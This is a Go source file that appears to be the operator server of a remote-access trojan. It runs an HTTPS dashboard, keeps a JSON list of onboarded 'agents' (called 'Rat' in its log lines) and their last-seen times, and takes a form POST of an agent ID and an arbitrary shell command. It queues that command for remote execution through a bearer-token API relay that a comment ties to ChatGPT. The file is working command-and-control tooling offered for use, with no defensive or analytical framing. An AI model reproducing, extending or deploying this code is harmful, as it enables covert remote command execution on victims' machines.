package main

import (
	"api"
	_ "embed"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"time"
)

//go:embed bearer.txt
var bearer string

type RPCAgent struct {
	DateRequest  time.Time      `json:"DateRequest"`
	DateReturn   time.Time      `json:"DateReturn"`
	RPCRequestId string         `json:"RPCRequestId"`
	RPCRequest   api.RPCRequest `json:"RPCRequest"`
	RPCReturn    api.RPCReturn  `json:"RPCReturn"`
}

type Agent struct {
	Id          string          `json:"Id"`
	LastSeen    time.Time       `json:"LastSeen"`
	OnboardData api.OnboardData `json:"OnboardData"`
	RPCAgentAll []RPCAgent      `json:"RPCAgentAll"`
}

// TODO : use map instead of array, decrease the complexity
type Agents struct {
	Agents []Agent `json:"Agents"`
}

func IsValidURL(url string) bool {
	switch url {
	case
		"/", "/milligram.min.css", "/data.json":
		return true
	}
	return false
}

//go:embed index.html
var index_page []byte

//go:embed milligram.min.css
var milligram_css []byte

// global variable of last file check on chatGPT
var last_check = time.Date(2020, 0, 0, 0, 0, 0, 0, time.Local)
var check_every, _ = time.ParseDuration("30s")
var certificate = "certificate.crt"
var private_key = "privateKey.key"
var listening = ":4443"

func do_onboarding(agents *Agents) {
	//Onboarding Data
	log.Println("Refreshing Onboarded agents")
	last_check = time.Now()
	RPCagents := api.ReadOnboard(bearer)
	for id, data := range RPCagents {
		fmt.Println("read :", id, ": ", data)
		is_new := true
		for i, active_agent := range agents.Agents {
			if id == active_agent.Id {
				agents.Agents[i].LastSeen = time.Now()
				is_new = false
			}
		}
		if is_new {
			a := new(Agent)
			a.LastSeen = time.Now()
			a.OnboardData = data
			a.Id = id
			a.RPCAgentAll = []RPCAgent{}
			agents.Agents = append(agents.Agents, *a)
		}
	}
}

func process_rpc_response(agents *Agents) {
	log.Println("Refreshing Response from agents")
	returns := api.ReadRPCResponse(bearer)
	for Id, resps := range returns {
		for _, ret := range resps {
			fmt.Println("Rat ", Id, " return ", ret)
			for i, active_agent := range agents.Agents {
				if Id == active_agent.Id {
					for j, rpc := range active_agent.RPCAgentAll {
						if rpc.RPCRequestId == ret.RequestId {
							agents.Agents[i].RPCAgentAll[j].RPCReturn = ret.Response
						}
					}
				}
			}
		}
	}
}

func update_agent_database(agents Agents) {
	file, _ := json.MarshalIndent(agents, "", " ")
	_ = ioutil.WriteFile("data.json", file, 0644)
}

func load_agent_database() Agents {
	DataFile, _ := os.Open("data.json")
	byteValue, _ := ioutil.ReadAll(DataFile)
	var agents Agents
	json.Unmarshal(byteValue, &agents)

	DataFile.Close()

	return agents
}

func write_content(w http.ResponseWriter, content_type string, data []byte) {
	w.Header().Add("Content-Type", content_type)
	w.Header().Add("Content-Length", fmt.Sprint(len(data)))
	w.Write(data)
}

func hand_get(w http.ResponseWriter, r *http.Request, agents Agents) {
	if r.URL.Path == "/data.json" {
		if time.Now().After(last_check.Add(check_every)) {
			do_onboarding(&agents)
			process_rpc_response(&agents)
		}
		log.Println("Serving Data.json")
		update_agent_database(agents)
		http.ServeFile(w, r, "."+r.URL.Path)

	} else if r.URL.Path == "/" {
		write_content(w, "text/html; charset=utf-8", index_page)
	} else if r.URL.Path == "/milligram.min.css" {
		write_content(w, "text/css; charset=utf-8", milligram_css)
	} else {
		fmt.Fprintf(w, "page not supported")
		w.WriteHeader(http.StatusNotFound)
	}
}

func hand_post(w http.ResponseWriter, r *http.Request, agents Agents) {
	if err := r.ParseForm(); err != nil {
		fmt.Fprintf(w, "ParseForm() err: %v", err)
		return
	}
	ratId := r.FormValue("agentId")
	command := r.FormValue("command")
	fmt.Fprintf(w, "agentId = %s\n", ratId)
	fmt.Fprintf(w, "command = %s\n", command)
	new_req := api.RPCRequest{"execute", []string{command}}
	requestid := api.WriteRPCRequest(bearer, ratId, &new_req)
	//Updating request data
	for i, active_agent := range agents.Agents {
		if ratId == active_agent.Id {
			new_rpc := new(RPCAgent)
			new_rpc.RPCRequestId = requestid
			new_rpc.RPCRequest = new_req
			new_rpc.DateRequest = time.Now()
			agents.Agents[i].RPCAgentAll = append(agents.Agents[i].RPCAgentAll, *new_rpc)
			log.Println("Adding this new command to data ", new_rpc)
		}
	}
	fmt.Fprintf(w, "requestId = %s\n", requestid)

}

func hand(w http.ResponseWriter, r *http.Request) {
	if !IsValidURL(r.URL.Path) {
		http.Error(w, "404 not found.", http.StatusNotFound)
		return
	}

	//Loading the data file
	agents := load_agent_database()

	switch r.Method {
	case "GET":
		hand_get(w, r, agents)
	case "POST":
		hand_post(w, r, agents)
		update_agent_database(agents)
	default:
		http.Error(w, "Method not supported, i'm a teapot", http.StatusTeapot)
	}
}

func main() {
	http.HandleFunc("/", hand)

	fmt.Printf("Starting HTTPS handler...\n")
	if err := http.ListenAndServeTLS(listening, certificate, private_key, nil); err != nil {
		log.Fatal(err)
	}

}
